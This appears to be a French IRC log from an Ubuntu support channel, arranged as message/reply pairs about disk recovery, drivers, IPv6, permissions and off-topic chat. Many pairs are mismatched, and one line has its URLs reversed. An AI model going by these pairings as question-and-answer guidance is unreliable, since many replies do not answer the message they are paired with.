beaver > Thx, je jette un oeil	oui, et ?
!wiki compilation	http://doc.ubuntu-fr.org/wine_compilation | http://doc.ubuntu-fr.org/blender_compilation
La réponse de uBOTu-fr était y'a... Je sais pas, 15 minutes environ ?	soit un op levé tôt, soit tu as trigger une reponse auto d' uBOTu-fr … ce qui n'est pas impossible vu que tu poses un sondage (ce qui déclenche rarement des réponses sur irc)
J'ai ouvert un sujet sur le fofo y'a quelques minutes > https://forum.ubuntu-fr.org/viewtopic.php?pid=20399121	en meme temps. a 1:15 du mat' ya pas grand monde
Wut ?	dont ask to ask, just ask
!wiki récupérer mot de passe	dwpsomc/gro.rf-utnubu.cod//:ptth | toor/gro.rf-utnubu.cod//:ptth | negwp/gro.rf-utnubu.cod//:ptth | edom_yrevocer/gro.rf-utnubu.cod//:ptth | essap_ed_stom_revitcased/gro.rf-utnubu.cod//:ptth
oui je comprend^	quand t'auras récupéré un système fonctionnel, on t'expliquera comment récupérer un mot de passe.
donc ipossible de mettre le mdp	ouais bref, t'as oublié ton mot de passe.
heu surment slytone je te crois sur parole je suis nul a tout cela^	je dis juste que logiquement, ©çamarche.
je suis passer de xp a sa mais je le trouve tres..hardcore on dira	très hardcore ? Essaye une Slack minimal ou une LFS, et on en reparle. :p
j'en prend note	ok, tu peux lire un peu ce que ça raconte ?
tu peux au moins commencer par dire quelle version et comment tu procèdes pour l'installation, live CD, live USB etc	merci.
en usb verssion 14.04	important pour toi oui mais pas pour nous
de toute évidence, j'avais raté la moitié des infos ! Le dump complet est là : http://pastebin.com/y7YhQpPH	libglib ou libc
et fais un paste ici (avec un pastebin)	juste la partie après le bt full ou aussi toute la sortie standard lors du plantage ?
Bonjour, j'ai une appli qui plante sur ubuntu 15.04 alors qu'elle fonctionne sur ubuntu 10.04. (recompilé par mes soins à chaque fois). J'en déduis que c'est une lib systeme qui me plante tout. Quelqu'un saurait me guider pour identifier la lib en question ?	essaie de lancer le programme avec gdb
Donc je suis sur offtopic :D	si tu n'as pas besoin de logiciels spécifiques, le choix est vite fait, non ?
!ot Tameiki	pour discuter d'autres choses que du support, merci de taper /join #ubuntu-fr-offtopic
ah ok	je doute que tu parles de ça x')
le gain est pas enorme :)	et mdm ?
(et je sais que xubuntu-desktop est un metapackage)	gdm
gdm	mouep, je suis à 217 MB of additional disk space will be used avec gdm
je vais voir le ddrescue	 https://doc.ubuntu-fr.org/utilisateurs/rmy/recuperer ← pour de la récup, tu as cette page sinon (rmy est un type vraiment cool qui nous a pondu une doc énorme, c'est son métier maintenant, et tu trouveras d'autres docs sur le site de son entreprise Diskcard).
!wiki dd	http://doc.ubuntu-fr.org/dd | http://doc.ubuntu-fr.org/ddrescue | http://doc.ubuntu-fr.org/gparted | http://doc.ubuntu-fr.org/mbr
ok Tameiki	t'as la commande dd qui est bien pour ça. dd if=/dev/sdxy of=/dev/sdxy (avec xy à adapter, commande assez dangereuse par contre, il vaut mieux faire gaffe…).
Ah des HDD de 40Go	pour discuter d'autres choses que du support, merci de taper /join #ubuntu-fr-offtopic
y as pas un refresh a faire ?	 tu as pas rebooté ?
quelqu un peut me le renvoyé	tu es la?
j ai plus les lignes de code	fait comme dit Oleti t
tu vx que je le branche en intern au pc ?	oui juste avant d'utiliser gparted ( pour ne pas prendre bcp de risque )
ben le serveur marche mais les dossiers sont vide, il doit monter les partitions du système mais pas celle des données	 c est un disque interne que tu transformes en externe ?
je suis pret a courir le risque... mais c est si compliqué ?	avant de faire n'importe quoi juste essaye de voir ton disque dans GPARTED ( ne touche rien surtout mnt )
c est lequel ou je peux en avoir 2 ?	ya une très petite chance mais ca risque de te perdre plusieurs choses
mbr c est quoi ?	 du raid 5 tu n'as droit qu'a un disque HS
mais j ai compris la lecon.... j ai commande un as en raid 5... comme ca meme si y en a 2 qui pete je perds pas tous...	1er secteur d'amorcage
soit le disque ne dit pas les bonnes infos, soit le logicie ne donne pas les bonnes infos	c'est pour ça que j'arrive plus à compter ^^ merci d'avoir relevé la chose :)
on en voit 4 j'arrive pas à comprendre	 dans cette meme commande, ça dit que le disque fait 746giB
sdc = le disque, sdcX les partitions	comment tu comptes alors via ce pastebin ? http://paste.ubuntu-fr-secours.org/src-147632
comment tu comptes alors via ce pastebin ? http://paste.ubuntu-fr-secours.org/src-147632	 dans cette meme commande, ça dit que le disque fait 746mb
j ai pas compris "[20:50] <kairo> hum pas comme le canal ubuntu"	j fait un test pour la commande info ici mais elle marche pas
non c'est excellent avelldiroll	pour le problème de Guest21935 est ce que la commande " gdisk -l /dev/sdc " va resoudre le problème ?
je vais essyé de voir avec read2fs	es tu la?
ok	mount /dev/sdc1 /media/test
oui usb	mkdir /media/test
root@Linux:~# sudo tailf /var/log/kern.log Aug 15 19:51:34 Linux kernel: [  426.068653] scsi 7:0:0:0: Direct-Access     WD       30EZRX External  1.06 PQ: 0 ANSI: 0 Aug 15 19:51:34 Linux kernel: [  426.069287] sd 7:0:0:0: Attached scsi generic sg3 type 0 Aug 15 19:51:34 Linux kernel: [  426.070389] sd 7:0:0:0: [sdc] 1565565872 512-byte logical blocks: (801 GB/746 GiB) Aug 15 19:51:34 Linux kernel: [  426.071715] sd 7:0:0:0: [sd	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
fait	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
c'est compliqué tout ça	t'es contre les logiciels libres ? :/ je vois pas la finalité de tes propos
(éviter qu'un concurrent dépose le brevet)	donc un fork d'un logiciel libre qui est sujet d'un ou de brevets n'est plus possible car Artifex ne voudra plus protéger le fork ?
donc un fork d'un logiciel libre qui est sujet d'un ou de brevets n'est plus possible car Artifex ne voudra plus protéger le fork ?	si car tu as automatiquement une licence de brevet, ce grâce à la GPL
et très souvent, le logiciel libre est couvert par un droit d'auteur	qui paye pour déposer et renouveler les brevets?
je le partage aussi	aussi, mais si tu reflechis d'un point de vue programmation, avec un logiciel libre, tu peux forker tres facilement, ça pousse à la perfection
aussi, mais si tu reflechis d'un point de vue programmation, avec un logiciel libre, tu peux forker tres facilement, ça pousse à la perfection	car pas de protections, pas de brevets déposés, etc
le logiciel libre est incompatible avec le système de royalties	un autre point de vue :)
une connaissance à mes yeux, ne vaut que si elle est partagee mezen nope ?	oui et non
oui et non	ils poussent à la stagnation
ils poussent à la stagnation	la justice c'est de ne payer qu'une seule fois la licence tant que l'ordinateur en question est toujours compatible
vivement que ubuntu touch soit stable que je reinstalle mon ipad	bein, c'est à cause des logiciels privateurs qu'il y'a des problemes sous Ubuntu, t'as des societes qui partagent pas leur savoirs, je trouve ça pas cool
je pensais que tu sortais un peu de chez toi ;)	bein je sais juste que c'est privateur, c'est embetant quand meme tu avoueras, apres oui j'affirme, je connais pas les produits apple
c'est quoi apple	à priori un concurrent à samsung :p
ok mrci	c'est bien un mac intel?
=)	en fait, je crois que tu peux l'installer
il risque de ne pas vouloire s'install si je laisser une partition de 20Go libre en HFS ? c'est ubuntu le probleme ou le GPT ?	je pense que tu peux pas l'installer l'os d'apple sur un volume partitionné en GPT
https://forum.ubuntu-fr.org/viewtopic.php?id=424373 je suis sur ça maintenant, je vous dis quoi :)	s/customisation/personnalisation
J'essai de configurer la carte graphique d'un ordinateur sur lequel je viens d'installer ubuntu. J,ai suivi plusieurs guides en ligne et toujours pas réussi à ce que l'affichage soit reconnu. Je suis incapable de changer la résolution pour autre chose que 1024x768 ou 800x600. Est-ce que quelqu'un pourrait m'aider ?	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
Salut Brioche	bonjour à toi
Du network manager tout craché :)	*nm-applet
'fin bon, il faudrait déjà que tu sois présent	oups désolé
non je tourne sur le libre avec une mauvaise résolution	ça dit quoi ?
ou d'ordi lol	juste revenir en 14.04 pas besoin de payer une cg ou pc
ok merci	tu es la?
c'est une supposition, mais tu penses que ça passerait ?	je pense aussi possible
ok jojo_ mais le downgrade doit fonctionner	hm, si il faut le package x11-common (2 1:7.0.0) sur sa Ubuntu 15.04
oui jusqu'à la 14.04	ou essaye d'installer la version précédente du driver
mais depuis la 15.04 il n est plus dans les dépots	essaye de booter a partir de l'ancien kernel pour voir si ca fonctionne
mais le pire c'est que j'avais deja réussi avec les pilotes proprio a forcer la résolution mais je m'en souviens plus	c'est bien ça fab85100 ? avec le driver privateur tu as plus ta résolution en 1024*768 ?
!wiki nvidia.run	http://doc.ubuntu-fr.org/nvidia | http://doc.ubuntu-fr.org/cuda | http://doc.ubuntu-fr.org/carte_graphique | http://doc.ubuntu-fr.org/bumblebee | http://doc.ubuntu-fr.org/liste_carte_graphique
avant il y avait le fichier xorg.conf qu'on pouvait modifier	vga =! hdmi nope ?
merci :)	mon rootkit
pouete > Concernant ton message de tt à l'heure, quand tu parles de token, c'est au sujet du serveur ou de l'install ?	a non, juste que je pensais que tu te pleignais que le transfert etait long
bouahaha :'( Encore 38Go à déplacer (quand je suis parti j'étais à 70) avant de pouvoir lancer la réinstallation de mon pc :'(	tu utilise un token ring ?
(et FFXV qui est un jeu d'action bromance...)	je sais pas trops, je me suis arrété a ff6
c'est un jeu canapé, à faire avec des potes qui regardent, comme Uncharted	oui, c'est exactement le mot , "demandes"
si tu aimes pas ce genre de jeux, je comprends que tu aimes pas alros :)	pas que je n'aime pas en fait, juste que ça ne fait clairement pas parti de mes "demandes"
pourtant, on m'en disait tellement du bien que j'ai fais 2 opus sur PS3	Brothers est innovant dans la mainiere où il arrive à faire passer un message à travers le controller …
et Uncharted... c'est juste pas du tout mon genre de jeu, c'est du scénario avec gameplay d'assisté... comme les derniers Tomb Raider	ouais, la je comprends
uncharted … c'est pas un film ? enfin un film avec des qte?	trolololol
c'est comme ca que je jouais à vice city	on attends encore journey , flower , uncharted et ce genre de jeux plutot bien fais sur console ;)
(mais j'aime pas Fifa ni CallOf...)	on parle de jeu … callof et fifa, je ne vois pas l'interet
apres, viens le fameux debat pc vs console.	un debat ? … pas vraiment, les consoles c'est pour les jeux simples (simplistes?) qui dans 99 0es arriveront sous pc trois mois apres leur sortie console, pour moins cher
Salut AlexxC	"optimiser une VM" ca ne veut pas dire grand chose … "optimiser une VM pour tâche XYZ" ca a déjà plus de sens
haa oui, je vois mezen	ta question c'est quoi au juste ? :), pourquoi une LTS serait plus stable qu'une release normale ?
répondre à une question en la répétant sous la forme affirmative n'est pas une réponse 😉	d'après https://doc.ubuntu-fr.org/lts
pfff xD	c'est juste logique, tu veux que j'y ajoute quoi ?
qu'est ce qu'ils ont les serveurs ?	pour une stabilité à long terme <troll>
pourquoi est-ce qu'il font des version supportée à long terme ?	pour les serveurs probablement
y a t_il une version récente en CD ?	il y a des mini iso
Je peux le laisser tourner mais il me faut une version qui puisse me faire évoluer vers les dernieres	12.04, supporté jusqu'à avril 2017
oui	bah surtout que il faut bidouiller les sources.list
il me propose la mise à jour vers la version 12, telecharge 2 fichiers puis le gestionnaire se ferme et aucune trace des fichiers téléchargés	par internet, c'est un cauchemar
non j'ai Ubuntu 9.10 Karmic Koala ( le seul que j'avais en CD	c'est normal, installe par dessus, sans formater
Il n'y a pas un moyen de réinstaller unity, de manière à ce que les packages qui manque soit intaller?	sudo apt-get install ubuntu-desktop
apparamment il s'est installer de lui même après la suppression de celui si, deux minutes après	et ton ppa, il a rien installé ?
Comment je fais donc pour réinstaller les paquets de base que j'ai normalement lorsque j'installe ubuntu?	euh
si ton appli ré-apparaît comme par magie, tu pourras blamer Unity et aller faire un tour sur https://bugs.launchpad.net/ubuntu/+source/unity	et sur le bug tracker je mets un truc genre « unity has some magical failures » ? :')
Mais c'est pas impossible.	la prochaine fois que ça t'arrive, tente un : setsid unity &
Euh, je perds aussi la barre de titre du coup.	histoire de voir si c'est Unity qui pose problème
et avec wmctrl - l ... tu les vois tes fenêtres après leur disparition ?	bah là j'ai pu le bug x) .
donc Nek ?	je ne vois pas comment ça pourrait être autrechose qu'un raccourcis.
arf ... c'est moins drôle  comme ça ...	je ne sais pas ce que c'est ccsm x) .
je ne sais pas ce que c'est ccsm x) .	tant mieux
08/13/15 15:41:33 < beaver> 08/13/15 15:38:30 < *Nek> (je ne sais pas lequel c'est)	non pourquoi ? il faut comprendre les questions avant de répondre ?
sinon tout bètement avec <super> w et <shift><super> w ?	t'as pu comprendre toi ?
avec wmctrl -a "nom de la fenêtre" tu peux voir ou elle s'est caché	ouais beh en fait ça a été mon premier réflexe.
et tu sais pas non plus c'est quoi le raccourcis clavier, ça fait pas mal d'interrogations quand même :þ	c'est pas un raccourcis que j'ai défini (sinon je saurais lequel c'est!)
avec wmctrl -l tu as la liste de toutes les fenêtres ouvertes	:Þ
Unity	et tu sais pas si le comportement que tu provoques via un raccourcis clavier, si c'est toi qui l'a défini ou pas ?
edit: modinfo rtl8192cu > J'ai le firmware (j'épluche le fofo de mon côté)	A je crois que c'est ce truc là ... à vérifier précisément : https://doc.ubuntu-fr.org/wifi_broadcom_bcm43xx
qui m'affiche systématiquement ça Erreur : impossible de trouver ou charger la classe principale –jar	quand as-tu ce message d'erreur ?
j'ai deux versions	comment as-t-il été installé le java que tu veux supprimer ?
(Je viens de contacter le magasin où j'ai eu tout mon bazar, ils m'ont passé le numéro de Advance (la marque dudit boitier) au cas où.	J'ai trouvé ça à propos de ton driver .. la réponse 4 peut être : http://askubuntu.com/questions/457901/usb-2-0-device-scanner-does-not-work-with-xhci-hcd-on-usb-3-0-system
la différence usb3.0 et 3.1est noté dans lsusb ? Si oui alors c'est du usb 3.0	c'est peut être l'ancien qui met la bagaille sur le bus
Je viens de relancer mon pc (au cas où) et le boitier externe DD USB3 n'est toujours pas reconnu. Quelqu'un a une idée ? Merci d'avance	lsusb donne quelque chose ?
merci mezen je regarde ca	prépare un live CD ou un live USB, et fonce
vous avez une idée ?	il te faut un chroot sur ta partition ubuntu et un grub update
wep	sinon c'est gnome-terminal qui convertit tout seul
ça sent le vécu pour trouver ça aussi vite :D	 tous les jours...
ça doit pas faire de différence avec un live usb si?	il faut le faire avec la partition en question démontée
mais en tout cas, c'est une 12.04 pas à jour	merci pour le conseil du fsck, j'avais l'erreur suivante sur ma partition /home : "La date de dernière écriture du superbloc est dans le futur." fsck a réglé le problème tout seul
je suis chez dedizone	en tout cas, ça ne remet pas en cause le bon fonctionnement, juste que ça n'est pas secure
mon Ubuntu effectue un check filesystem à chaque boot, qui s'effectue jusqu'au bout, qu'est ce qui peut causer le probleme ? Quel log puis je regarder ?	essaie de lancer un fsck manuel depuis une session live, cela t'affichera le rapport complet
svp	je te suggère de faire du SFTP, tu n'auras rien d'autre à configurer pusque cela passera par ton service SSH
avec la regex #^<td><a href="/([0-9]+)">([^<>]+)</a></td>$# appliquée à chaque ligne, et je récupère les matches	Tu réalises que les sauts de ligne en Xhtml ne sont pas significatifs ?
Tu réalises que les sauts de ligne en Xhtml ne sont pas significatifs ?	je me base pas sur un cas général
ha ok attend voir ... en plus mon truc ne marche que pour le premier href d'une ligne	et biensûr du gère le cas d'un retour à la ligne dans ta chaine …
mais c'est si le doc xml le veut bien	sauf que je veux récupérer le etxte dans le <a> aussi
bah xpath/dom/autre, ça va charger mon fichier et le boucler ensuite non ?	avec un peu de chance : egrep  '<a href=(.*)>' test.html | sed 's/^.*<a href="//g' | cut  -d " " -f 1
s/xml/xhtml/	je préfère rester en bash
J'aimerais récupérer le 9999 et le texte (ça peut être n'importe quel caractère, pas seulement des lettres a-zA-Z, mais aussi éè....). J'ai essayé avec sed, mais je trouve pas de tutoriel clair, et mes essais ont tous échoués. Quelqu'un pourrait me donner la solution ? Merci pour votre aide.	http://stackoverflow.com/a/1732454
http://stackoverflow.com/a/1732454	bah suffit que je prenne tous les caractères ^[<>]
Snarf soit plus clair	Un jar est exécutable s'il contient dans son fichier Manifest une Main-Class
mais je n'y ccomprends rien c'est du bash	cherche /usr/lib/jvm/java-8-oracle/jre
drole de façon de me donner des indiications	j'ignorais ton niveau .... ouvre un term et fais ls -la tu les verras
export PATH=$PATH:$JAVA_HOME	voir .bashrc et .profile
bash: export: « /usr/lib/jvm/java-8-oracle/jre » : identifiant non valable	tu as visiblement un export avec un espace devant =
merci :)	si tu utilises debian, il faut t'adresser au support debian … le support irc officiel de debian est sur oftc, pas freenode … sur freenode tu as #debianfr et #debian-facile
mouhaha	sourceforge est effectivement un cheval de troie publicitaire
svp	dis toujours ?
bouhhhh	connexions simultanées ouverts <- ouvertes
connexions simultanées ouverts <- ouvertes	c'est un wiki, gogo :)
pourtant c'est senssé fonctionner	ce que tu peux faire aussi
Et là il m'enregistre en 644, va comprendre …	il n'a pas été porté vers Debian/Ubuntu ?
</dredi_credi>	bah j'aime bien cinnamon, c'est juste pour ça.
ah oups je sous mint là en fait ...	ceci explique cela
quelqu'un peut m'aider?	pose ta question on verra si on peut repondre
j'avais commencé avec Crunchbang mon premier	Debian sans DE sans rien pour un serveur :), c'est encore ze must je trouve
(c'est de l'ironie, un serveur ça aucun DE logiquement)	La mise à jour du microcode dans les périph propriétaire c'était pour ça ?
dans un terminal	y'a un warning sur une fonction deprecated c'est tout
je l'aime bien, car ya pas mal de choses useless dans l'ISO Ubuntu Server, si c'est juste pour installer un système minimal	un serveur c'est sous debian, pas sous ubuntu :)
les cochons	car ce n'est pas vraiment une ISO officielle, mais un bout auto-généré dans l'arborescence pour les config Ubuntu en PXE :p
L'option "Installer un système en ligne de commande" n'existe plus ?	l'ISO alternate n'est plus, je crois
J'ai donc besoin de tester, au sein de mon script, la presence du terme 'disabled' dans le resutat d'un 'xinput --list --long', pour savoir quoi faire apres.	reponse=$(xinput --list --long); if [[ $reponse =~ .*disabled.* ]]; then echo "contient"; else echo "ne contient pas"; fi
faut faire ça dans un script :)	tordu ... faut lancer l'appli ... récupérer tous les id de ses fenêtre et les déplacer avec wmctrl -i -r
ah bein wmctrl je pense :)	je m'en souviens maintenant ... le problème c'est qu'il ne marche que sur des fenêtres ouvertes pas sur des appli à lancer
http://askubuntu.com/questions/89946/open-application-in-specific-workspace roger_harmand	et pour gnome-shell ?
Est-il possible de lancer un programme dans un bureau spécifique, par exemple lancer firefox sur le troisième bureau ? J'avoue que je n'ai rien trouvé dans la documentation et les livres à ma portée. C'est juste pour ma documentation personnelle.	à l'époque je faisais ça sous conky avec ccsm
Je présume que si je fais la mise à jour vers Windows 10, Grub va partir ?	possible, mais tu pourras le réinstaller facilement de toute façon
est-ce ça veut dire qu'il rejette mon authentification? Genre mon mot de passe?	:)
cmd: lspci | grep -i net	:"), gaetane je précise quand même on sait jamais, nous acceptons pas d'argents ici, tout est gratuit, c'est une boutade
http://paste.ubuntu-fr-secours.org/src-147599	maintenant fais de meme par la cmd: lspci
tu vas finir par réussir pour pastebin	bien plus cher que ca, je l'ai payer 1500 €
:p	oki je comprend mieux le "ou tu sais ecrire"
tu copie colle dedans	tu es belge ?
Qu'est ce que vous avez besoin de savoir?	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
avec mon fil attaché à mon modem	ok
oui mais je ne parle pas de ma connection avec vous mais bel et bien de mon wifi. J'suis pas sur de comprendre sinon ce que tu veux dire	pour parler avec nous tu dois etre connecté au net ... utilises-tu un autre PC ?
gaetane un espace entre lsb_release et -a	super, mais tu sais si c'est unity ou bien lxde toi ? à savoir que je pense que le /etc/issue n'indique pas le DE
J'ai réouvert un autre terminal et il me dit la même chose: lsb_release-a Ça c'est ce que j'ai écrit	toujours dans le terminal, cd Bureau/
alors, une version d'Ubuntu avec le package lsb-base de pas présent, c'est possible ?	chaise clavier ...
chaise clavier ...	on va avancer 'fin on va essayer
on va avancer 'fin on va essayer	chaise clavier ...
oui pour la commande je suis sur car ça m'a répondu comme du monde mais si vous voulez je vais recommencer 2 p'tites sec	toujours dans le terminal, sudo apt-get install scrot
Je vais réécrire Bon je viens de réécrire la commande et maintenant il vienne de me dire commande introuvable	c'est bien ce que je dis tu tape pas la bonne commande
Ça c'était pour le CTR C	tu es sur d'avoir bien taper la commande ?
Je l'ai fait au moins 20 fois et ça répète la même chose éternellement seulement qu'à la fin de chaque ligne ça rajoute ^C	ferme le terminal et rouvre un nouveau
oui je l'ai valider et c'est comme s'il attendait que je fasse autre chose	il ne faut pas mettre les "
et on fait quoi avec ça?	quand nous aurons la version d'ubuntu que tu as, on avancera :)
c'est moche	!
non	appui sur la touche Windows du clavier et tape "terminal" puis entrer
ça sert à rien alors	ba completement a rien oui ... le principe d'ipv6 c'est une ip unique sur le net ...
je suis connecté seulement avec l'ipv4	tu aura une reponse correct en dhcp apres
Ben oui	alors il te faut l'ipv6 sur la box en premier
bon	ça peut être un probleme dns ? non ? tu ping6 quoi ? une ipv6 ? ou un ndd ?
...	que je comprenne bien ... tu cherche a avoir une ipv6 sur la box et sur le PC ?
ça marche pas je vous dis	ba la elle ne l'a pas et c'est pas en bricolant ton PC que ca va changer quelquechose
Ben elle devrait l'avoir	ping autre chose que la box alors
marcher	si tu veux te co en v6 .. pk pas ... mais comme ta box n'a pas d'ipv6 ... tu pourra pas communiquer avec elle
mais ça ne marche pas	quel est l'interet ? l'ipv6 en local ca sert a quoi ???
quel est l'interet ? l'ipv6 en local ca sert a quoi ???	je veux me connecter avec l'ipv6 sur la box
je ne suis pas connecté en ipv6	mais alors quel interet d'etre en ipv6 en local ? je comprends pas
ping6 marche pas	que donne : http://test-ipv6.com/
qu'il soit actif ou non	apparement c'est désactivé et on peut plus activer ça chez sfr
ok j ai appuyé sur f6	tu selectionne CPU 0.000000e+00t tu fais entrer
j'a fais ce que tu m'as dit $	ensuite regarde les barres de charge CPU
oui	tri les processus par utilisation CPU avec la touche F6
avec quoi ?	c'est bien ça ? je me trompe pas ?
c'est bien ça ? je me trompe pas ?	c'est pour empecher les pirates de toucher au reseau interne
apres ce que tu m'as dit de faire je fais quoi ?	lance la commande : htop
mais ici je peux pas choisir	tu as bien activer l'IPV6 sur la box ?
tu as bien activer l'IPV6 sur la box ?	http://i.imgur.com/Te17haa.png
http://i.imgur.com/Te17haa.png	c'est clairement marqué Non connecté ??
ubuntu 14.10	bon on va essayer : sudo apt-get install htop
je vais voir ça	ip -6 addr show dev <interface> ça dit quoi ?
ip -6 addr show dev <interface> ça dit quoi ?	http://sprunge.us/cYTe
*FirmWare	http://sprunge.us/cYTe
FW ?	c'est le Firware mais tu as repondu deja
mh	regarde le FW au passage
regarde le FW au passage	NB6V-MAIN-R3.4.5
sfr	quel model ?
je me connecte via connman, j'ai essayé directement avec wpa_supplicant et dhcpcd	tu as une box ?
j ai fais en cd	donc … quand tu es en live cd est ce que tu as ce probleme de ralentissement ?
par exemple la ou je mets le mot de passe j'ai des taches blanche qui clignote juste au moment ou sa arrete	le retour de cette commande ?
oui	sous un autre o/s tu as ce probleme ?
sur le pc la non sinon je joue sur un autre	install htop et regarde ce que ca dis
c'est plus rapide ici c'est instanéé sur le forum c'est plus compliquer	quel est ton probleme exact ?
j ai les configs du cpu	tu es peut être pas à l'aise avec IRC, c'est pas exclure, tu sais que sur un forum, tu as plus de temps pour répondre aux questions etc :)
?	tu ouvres le boitier lol
Il y a une solution pour mette des programme qui tourne sous Windows ?	t'es sérieux ?
Le problème c est que pas beaucoup de programme tournent sur Ubuntu	as tu conscience, que ça fait ~ 1h que j'essaye d'avoir le résultat de deux commandes, et qu'actuellement, nous avons toujours aucun détails concernant ton matériel, même si ton probleme est résolu, ça permet de connaitre le pourquoi du comment vois tu ?
Hello j'ai plusieur question est ce que quelqu'un peux m'aider ?	Je te propose les réponses : oui, non, peut-être et oui ! A toi de poser les questions qui correspondent à ces réponses maintenant ^_^
essaie déjà comme ça beaver et tu verras à l'usage	oui :), mezen irssi, mais c'est bon, tout est déjà automatisé
et donc, ton cloak ?	si c'est xchat, je peux te concocter un petit script tcl pour automatiser cela
si tu as pas groupé le pseudonyme, ton identification à freenode passe pas	avec quel client ?
mais bon, tu dois être spécial :p	ça peut arriver de cumuler des pseudonyme en "______" à rallonge à cause des netsplit
tu serais sous Ubuntu pour faire ton ssh-copy-id tu serais au bon endroit, gnome06 tu es le bienvenue :)	pour le reste c'est à gérer dans ton client
pour le reste c'est à gérer dans ton client	il peut faire le tout de facon automatique à chaque connexion à Freenode ?
ok je ne vous polue pas plus alors. Desole.	tu peux tester avec une machine client ubuntu ?
tu peux tester avec une machine client ubuntu ?	j’ai trouvé merci.
s/Max/Mac rofl	ZNC peut s'authentifier à Nickserv
et je tente de copier la cle sur un server distant ubuntu	le probleme il est là, OSX et le /topic du channel #ubuntu-fr
Est que quelqu’un sait pourquoi lorsque je fait un » ssh-copy-id «  j’obtiens un « The agent has no identities » dans le fichier « authorized_keys «  ??	pouvons nous avoir l'erreur dans son integralité ?
il suffit de changer le serveur dans irssi de chat.freenode.net en tonproxy.example.org	et je pense pas que ZNC puisse faire ça : autosendcmd = "/msg nickserv ghost beaver password;/msg NickServ identify password;wait 8000;/nick beaver;/win 3;/away Absent";
du moins si c'est le cas nesthib c'est pas ce que je recherche, je veux garder irssi	ZNC est un bouncer IRC (un proxy)
*rejoindre	tu penses que c'est possible via une commande ? http://wiki.znc.in/Using_commands visiblement nope
t'es sous unity?	semble avoir des troub avec sa carte video et unity, j'peut pas l'aider vraiment
j'utilises le driver propriétaire de nvidia	j'ai le driver libre de base ATI et j'ai jamais eu ce problem
lolll beaver , ta l'air découragé lolll XD	j'ai l'air d'une personne qui va ajouter une personne dans sa liste d'ignore malheureusement :(
frequence max 1300 mhz, j'aimerais le monter à 1500, c'est possible	j'ai l'air d'une personne qui ajouter une personne dans sa liste malheureusement :(
J'ai lu que c'était matériellement possible, mais je coince :/	tu fais genre passerelle quoi
mezen > Ok, je compte faire des achats en ligne (boitier externe pour HDD par exemple) et je trouvant pas de solutions à mon pb, le voulais acheter une clef wifi-usb en même temps s'pour ça. Sur Grosbill y'en a pas mal donc j'aurai aimé couper une partie	lien en notice
mezen > Je viens justement de tomber là dessus :D	alors vise une clé sur le net et regarde dans la liste si elle est supportée
Moi je suis en train de me battre avec ma spécialité: le réseau...	y'a des infos ici
J'peut poser ma petite question ? Ou c'est pas fini avec max :3	vas-y je t'en pris :)
Pire, tu te fais mute	>PAFF<
[17:12:02] Your status has been set: [_>o]	bref tu as tes loggs à présent
[17:12:01]  with resource mcabber.45514bc4	le paste est fait pour copier coller tes messages/loggs etc .. quand ça fait plus de 2 lignes
[17:12:01] Connecting to server	tu floodes tout le monde sur le salon
j'ai quelque chose d'interessant      Special buffer: [status]	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
c'est quoi l'histoire des 700 ? j'essai de comprendre	MAIS STOP TES PASTE là
vous avez p'tet oublié la reccursive dans votre chmod .mcabber ?	j'aime pas trop faire un chmod 700 -r à l'arrache
[17:08:53] Your status has been set: [_>o]	là tes dossiers était en 777
\_o<	>PAN<
RHAAAA	"This guy gave me cancer"
ou juste	ça change les droits sur le fichier de conf et le répertoire
mais mais ... :'(	J'crois que c'est peine perdue
sa fait ça : drwxrw-r-- 2 maxleliseux maxleliseux 4096 août   7 16:47 /home/maxleliseux/.mcabber/histo	ls -ld ~/.mcabber
J'aime bien quand c'est bien verbeux :D	on a pas besoind e voir l'intégralité de son home hein
heu .. -/histo	J'suis habitué au ls -al :D
sa fait quoi ces commandes ?	ça va afficher les droits de ~/.mcabber/histo
toujours [16:57:42] WARNING: Bad permissions [/home/maxleliseux/.mcabber/]	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
Et paste	STOP
merde min lolll	Fais un : ls -al ~
mais sans déconner	Homeception
oui -_-	sérieux ?!
ok	mkdir -p /home/maxleliseux/.mcabber/histo/
c'est fait merci uBOTu-fr	?
ok, sa me dit (ERROR: Cannot access history log directory, logging DISABLED) dans le login mCabber, normal y'a pas de .mcabber/histo/ fuck l'historique lolll XD	Utilisez http://paste.ubuntu-fr-secours.org/ pour les copiés/collés, mettez votre pseudonyme dans le champ idoine, merci !
pastebin bordel !!!!	le troisieme logiquement, il est fatal
ok ouin...	Ben typiquement
Faudrait que je m'y remette...	:)
https://wiki.tox.chat/users/clients	bon à savoir :)
bon à savoir :)	Ouais
nope Encrypt	j'ai modifier le code et sa donne toujours la même chose ([16:08:55] WARNING: Bad permissions [/home/maxleliseux/.mcabber/]
si j'insiste max_leliseux c'est que c'est vraiment ultra clair, même pour un non initié	j'ai modifier le code et sa donne toujours la même chose (maxleliseux/.mcabber/histo)
je suis pret à faire quelque chose (quelqu'un peut me devancer, c'est son droit :)), mais me concernant, je te laisse ~ 40 min de lecture et de comprehension, et de google translate ou équivalent au besoin max_leliseux :)	Tox 'ets un système de messagerie P2P chiffré
je t'invite à traduire ce qui a apres les # c'est tres explicite	peux-tu m'expliquer grossièrement le fonctionnement du code pour les log stp ? juste les grandes ligne uniquementç
oui j'suis la j'suis la j'suis la XD	la question de McPeter elle te concerne
Ah ouais, bizarre	vraiment oui
Hum...	c'est bizarre, la commande sensible-browser m'ouvre firefox pourtant :/
oui	T'as logout / login ? :P
si, je selectionne bien google-chrome, et rien à faire, c'est firefox qui se lance	Et si tu relances la commande ?
et les wikis ont l’air de pas avoir été updaté depuis années	y aurait il pas un bouton activation/desactivatio ??
et il y a une pahe qui pourrait me guider pour créer ce serveur DNS?	as tu essayé avec l'adresse IP de ton serveur ?
j'ai créé un fichier conf ou j'ai ajouté ce nom de domaine	port 80 ou 8080 ? Firewall ?
on trouve des choses, mais j'ai l'impression que le niveau est vraiment trop trop facile	pour discuter d'autres choses que du support, merci de taper /join #ubuntu-fr-offtopic
